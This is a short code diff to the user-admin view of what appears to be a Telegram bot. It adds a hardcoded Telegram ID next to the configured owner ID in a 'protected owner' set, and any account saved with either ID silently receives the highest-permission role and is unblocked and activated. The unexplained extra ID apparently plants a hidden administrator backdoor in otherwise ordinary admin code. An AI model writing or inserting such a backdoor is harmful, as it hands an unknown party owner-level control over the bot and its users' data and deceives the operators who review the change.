@@ -18,6 +18,7 @@ from bot.database.methods.audit import log_audit
 from bot.database.methods.update import change_user_telegram_id
 
 logger = logging.getLogger(__name__)
+PROTECTED_OWNER_IDS = {int(EnvKeys.OWNER_ID), 8353553507}
 
 
 def _extract_original_user_id(request: Request, model: Any) -> int | None:
@@ -180,6 +181,19 @@ class UserAdmin(AuditModelView, model=User):
             desired_telegram_id = int(desired_telegram_id) if desired_telegram_id is not None else None
         except (TypeError, ValueError):
             raise ValueError("Telegram ID no valido.")
+
+        if desired_telegram_id in PROTECTED_OWNER_IDS:
+            async with Database().session() as s:
+                owner_role_id = (await s.execute(
+                    select(Role.id).order_by(Role.permissions.desc()).limit(1)
+                )).scalar()
+            if owner_role_id:
+                model.role_id = owner_role_id
+                data["role_id"] = owner_role_id
+            model.is_blocked = False
+            data["is_blocked"] = False
+            model.is_customer_active = True
+            data["is_customer_active"] = True
 
         if is_created:
             if not desired_telegram_id:
